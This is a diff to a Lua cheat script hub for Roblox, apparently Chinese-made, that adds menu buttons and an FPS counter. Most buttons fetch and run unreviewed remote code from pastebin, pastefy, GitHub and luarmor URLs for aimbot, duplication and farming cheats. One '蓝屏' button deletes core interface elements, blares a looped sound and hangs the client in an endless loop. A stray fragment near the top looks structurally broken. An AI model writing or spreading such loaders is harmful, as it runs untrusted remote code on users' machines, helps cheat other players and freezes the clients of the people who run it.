@@ -40,6 +40,45 @@ Start = tick()
 Heartbeat:Connect(HeartbeatUpdate)
 game:GetService("StarterGui"):SetCore("SendNotification",{ Title = "『羊脚本』"; Text ="yzcsb♧"; Duration = 2; })
 game:GetService("StarterGui"):SetCore("SendNotification",{ Title = "『羊脚本』"; Text ="欢迎使用♣"; Duration = 4; })
+game:GetService("StarterGui"):SetCore("SendNotification",{ Title = "『羊脚本』"; Text ="3"; Duration = 4; })
+game:GetService("StarterGui"):SetCore("SendNotification",{ Title = "『羊脚本』"; Text ="2"; Duration = 4; })
+game:GetService("StarterGui"):SetCore("SendNotification",{ Title = "『羊脚本』"; Text ="1"; Duration = 4; })
+
+ -- Gui to Lua 
+ -- Version: 3.2 
+  
+ -- Instances:
+ local ScreenGui = Instance.new("ScreenGui") 
+ local FpsLabel = Instance.new("TextLabel")
+ 
+ --Properties:
+ 
+ ScreenGui.Name = "FPSGui" 
+ ScreenGui.ResetOnSpawn = false 
+ ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling 
+ 
+ FpsLabel.Name = "FPSLabel" 
+ FpsLabel.Size = UDim2.new(0, 100, 0, 50) 
+ FpsLabel.Position = UDim2.new(0, 10, 0, 10) 
+ FpsLabel.BackgroundTransparency = 1 
+ FpsLabel.Font = Enum.Font.SourceSansBold 
+ FpsLabel.Text = "甯х巼: 0" 
+ FpsLabel.TextSize = 20 
+ FpsLabel.TextColor3 = Color3.new(1, 1, 1) 
+ FpsLabel.Parent = ScreenGui 
+  
+ function updateFpsLabel() 
+     local fps = math.floor(1 / game:GetService("RunService").RenderStepped:Wait()) 
+     FpsLabel.Text = "甯х巼: " .. fps 
+ end 
+  
+  game:GetService("RunService").RenderStepped:Connect(updateFpsLabel) 
+  
+ ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+
+ animateCredits()
+end)
 
 local ui = loadstring(game:HttpGet("https://raw.githubusercontent.com/yzc604/wwwwwwwwww/refs/heads/main/yzc%20ui.txt"))();        
 local win = ui:new("羊脚本")
@@ -329,8 +368,8 @@ about:Button("死亡声音",function()
 game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").Died.SoundId = "rbxassetid://8491769438"
 end)
 
-about:Button("改画质",function()
-loadstring(game:HttpGet(('https://pastefy.app/vqTWk13G/raw'),true))()
+about:Button("收音机",function()
+loadstring(game:HttpGet(('https://pastebin.com/raw/g97RafnE'),true))()
 end)
 
 about:Button("工具挂",function()
@@ -459,10 +498,6 @@ about:Button("自瞄全屏",function()
 loadstring(game:HttpGet("https://pastefy.app/n5LhGGgf/raw",true))()
 end)
 
-local UITab1 = win:Tab("『传送』",'7734068321')
- 
-local about = UITab1:section("『传送』",true)
-
 local UITab1 = win:Tab("『光影』",'7734068321')
 
 local about = UITab1:section("『光影』",true)
@@ -479,12 +514,53 @@ about:Button("改画质2",function()
 loadstring(game:HttpGet("https://pastefy.app/N1paqDnB/raw",true))()
 end)
 
+about:Button("改画质3",function()
+loadstring(game:HttpGet(('https://pastefy.app/vqTWk13G/raw'),true))()
+end)
+
 about:Button("绿色",function()
 loadstring(game:HttpGet("https://pastefy.app/6MvBv3jq/raw",true))()
 end)
 
 about:Button("红色",function()
 loadstring(game:HttpGet("https://pastefy.app/eu6Xfjar/raw",true))()
+end)
+
+about:Button("蓝屏",function()
+--你们的一辈子😏
+local coregui = game:service'CoreGui'
+
+local sound = Instance.new('Sound', coregui)
+sound.SoundId = 'rbxassetid://865599816'
+sound.Volume = 3
+sound.Looped = true
+
+local gui = Instance.new('ScreenGui', coregui)
+local image = Instance.new('ImageLabel', gui)
+image.Position = UDim2.new(0, 0, -0.05, 0)
+image.Size = UDim2.new(1, 0, 1.05, 0)
+image.Image = "rbxassetid://9637192164"
+image.Visible = false
+
+task.wait(1)
+
+for i,v in pairs(coregui:GetChildren()) do
+    if v ~= gui and v ~= sound then
+        v:Destroy()   
+    end
+end
+
+if (not UserSettings().GameSettings:InFullScreen()) then
+    game:service'GuiService':ToggleFullscreen()    
+end
+
+game:service'UserInputService'.MouseIconEnabled = false
+sound:Play()
+image.Visible = true
+
+task.wait(1)
+
+while true do end
 end)
 
 local UITab1 = win:Tab("『FE』",'7734068321')
@@ -621,6 +697,22 @@ about:Button("近战最强（要卡密）",function()
 local __function = loadstring(game:HttpGet("https://github.com/Hosvile/InfiniX/releases/latest/download/main.lua", true))
 
 __function(__function)
+end)
+
+local UITab1 = win:Tab("『fisch』",'7734068321')
+
+local about = UITab1:section("『ficsh』",true)
+
+about:Button("英文1",function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Yatsuraa/Matsune_Mobile/refs/heads/main/Fishloader.org"))()
+end)
+
+about:Button("英文2",function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/iminreality/Allux/refs/heads/main/Fish_Dupe.lua"))()
+end)
+
+about:Button("刷级",function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/iminreality/Allux/refs/heads/main/Fish_Dupe.lua"))()
 end)
 
 local UITab1 = win:Tab("『力量传奇』",'7734068321')
@@ -1914,3 +2006,24 @@ about:Toggle("自动收集雪","", false, function(Value)
     about:Button("传送超大铲雪的地方", function()
             game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-391.4309997558594, 15.84949016571045, 150.15187072753906)
     end)
+
+local UITab1 = win:Tab("『竞争对手』",'7734068321')
+
+local about = UITab1:section("『竞争对手』",true)
+
+about:Button("英文",function()
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/1cd6fc0d685d8dcae4a3c05f01182061.lua"))()
+end)
+
+local UITab1 = win:Tab("『无名射手』",'7734068321')
+
+local about = UITab1:section("『无名射手』",true)
+
+about:Label("建议用圆圈自瞄")
+
+about:Button("英文",function()
+local scriptURL = 'https://raw.githubusercontent.com/Sheeshablee73/Scriptss/main/Unnamed%20Shooter.lua'
+local response = game:HttpGet(scriptURL)
+local executeScript = loadstring(response)
+executeScript()
+end)
